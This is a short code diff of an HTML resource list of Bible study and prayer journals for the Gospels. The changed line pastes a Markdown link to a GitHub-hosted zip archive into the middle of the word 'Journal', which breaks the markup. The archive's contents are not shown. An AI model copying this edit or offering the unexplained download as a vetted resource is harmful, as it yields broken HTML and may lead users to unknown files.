@@ -118,7 +118,8 @@
   <div class="resources">
     <!-- Replace # with actual links -->
     <a href="#">📄 Matthew Bible Study + Prayer Journal</a><br/>
-    <a href="#">📄 Mark Bible Study + Prayer Journal</a><br/>
+    <a href="#">📄 Mark Bible Study + Prayer Journ[Stronger-with-Jesus-5ce2d07dc84317da6c42a6c6a3d560698d30f268.zip](https://github.com/user-attachments/files/21324406/Stronger-with-Jesus-5ce2d07dc84317da6c42a6c6a3d560698d30f268.zip)
+al</a><br/>
     <a href="#">📄 Luke Bible Study + Prayer Journal</a><br/>
     <a href="#">📄 John Bible Study + Prayer Journal</a><br/>
     <a href="#">📄 Combined Studies & Journals (All 4 Gospels)</a>
